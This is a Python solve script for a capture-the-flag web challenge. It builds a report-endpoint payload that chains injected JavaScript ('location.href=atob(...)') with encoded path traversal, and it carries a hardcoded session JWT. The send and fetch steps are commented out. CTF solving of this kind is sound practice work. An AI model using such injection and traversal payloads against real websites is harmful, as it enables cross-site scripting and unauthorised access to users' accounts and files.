import requests
import base64

URL = 'http://ctf.tcp1p.team:10017'
flag = '/flag/n2.js'
payload = base64.b64encode(flag.encode())
print(payload)
url = {"url":"http://proxy/document/1;location.href=atob('{}')//..%2f..%2flogin.html".format(payload.decode())}
cookies = {'session': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDc0LCJ1c2VybmFtZSI6ImJ5ZjFzaCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzI4ODkzMzAxfQ.3oiuk8HPoJsSFSxTkpRaV-oarP1wZfYkij3HK_7UfbQ'}

print(url['url'])

# response = requests.post(URL+'/report/', data=url)
# print(response.text)
# print('============= GET FLAG =============')
# res = requests.get(URL+f'{flag}', cookies=cookies)
# print(res.text)